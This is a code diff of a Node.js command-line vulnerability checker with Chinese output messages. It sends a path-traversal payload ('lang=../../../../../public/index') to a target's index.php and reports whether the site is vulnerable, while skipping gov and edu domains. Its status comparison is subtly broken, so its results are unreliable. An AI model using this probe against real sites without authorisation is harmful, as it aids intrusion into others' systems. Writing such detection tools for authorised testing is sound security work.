@@ -1,7 +1,7 @@
-const axios = require('axios');
 var clc = require("cli-color");
 const inquirer = require('inquirer');
 const lineReader = require('line-reader');
+const fetch = require("node-fetch");
 console.log(clc.green(`=========================================
 ______ _____       _        _____           
 |____  / ____|    (_)      / ____|          
@@ -36,8 +36,7 @@ inquirer
                 name:"url",
             },
         ]).then(answer=>{
-            console.log(answer.url)
-            checkVul(answer.url);
+           checkVul(answer.url); 
         });
         
     }else{
@@ -54,13 +53,13 @@ inquirer
         });
     }
   });
-function checkVul(url,existCallback,notExistCallback){
-    if(url.toLowerCase().includes("gov") || url.toLowerCase().includes("edu")){
+  async function checkVul(url,existCallback,notExistCallback){
+  /*  if(url.toLowerCase().includes("gov") || url.toLowerCase().includes("edu")){
         console.log(clc.yellow(`[-] ${url} 暂不支持检测该域名`))
         return;
     }
   try{
-    axios.get(`${url}/?lang=../../../../../public/index`)
+    axios.get(`${url}/index.php?lang=../../../../../public/index`)
     .then(function (response) {
         console.log(clc.yellow(`[-] ${url} 不存在该漏洞`))
     })
@@ -75,6 +74,29 @@ function checkVul(url,existCallback,notExistCallback){
     });
   }catch(e){
     console.log(clc.yellow(`[-] ${url} 访问时发生了错误`))
+  }*/
+// demo01.js
+  if(url.toLowerCase().includes("gov") || url.toLowerCase().includes("edu")){
+    console.log(clc.yellow(`[-] ${url} 暂不支持检测该域名`))
+    return;
   }
+  try{
+  var r1 = /http[s]{0,1}:\/\/([\w.]+\/?)\S*/;
+  var res = url.toLowerCase().match(r1);
+  if(!res){
+    console.log(clc.yellow(`[-] ${url} 请输入正确的URL!`))
+    return;
+  }
+  const response_normal = await fetch(`${url}/index.php?lang=AAA`);
+  const response = await fetch(`${url}/index.php?lang=../../../../../public/index`);
+
+  if(response_normal.status == 200 && response != 200){
+    console.log(clc.green.bold(`[+] ${url} 存在该漏洞`))
+  }else{
+    console.log(clc.yellow(`[-] ${url} 不存在该漏洞`))
+  }
+}catch(e){
+  console.log(clc.yellow(`[-] ${url} 连接超时或者发生错误!`))
+}
 
 }
